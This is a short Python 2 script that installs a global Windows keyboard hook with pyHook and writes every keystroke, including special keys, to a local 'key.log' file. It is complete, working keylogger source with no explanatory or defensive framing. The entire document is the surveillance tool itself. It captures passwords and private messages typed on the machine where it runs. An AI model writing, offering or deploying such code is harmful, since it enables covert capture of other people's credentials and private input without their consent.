import pythoncom
import pyHook


def key_pressed(event):
    global keys
    if event.Ascii == 0:
        print event.Key

    if event.Ascii == 8:
        key = '<%BACKSPACE%>'
    elif event.Ascii == 9:
        key = '<%TAB%>'
    elif event.Ascii == 13:
        key = '<%ENTER%>'
    elif event.Ascii == 0:
        key = '<%' + event.Key + '%>'
    else:
        key = chr(event.Ascii)

    keys += key

    f = open('key.log', 'w')
    f.write(keys)
    f.close()


keys = ''
obj = pyHook.HookManager()
obj.KeyDown = key_pressed
obj.HookKeyboard()
pythoncom.PumpMessages()
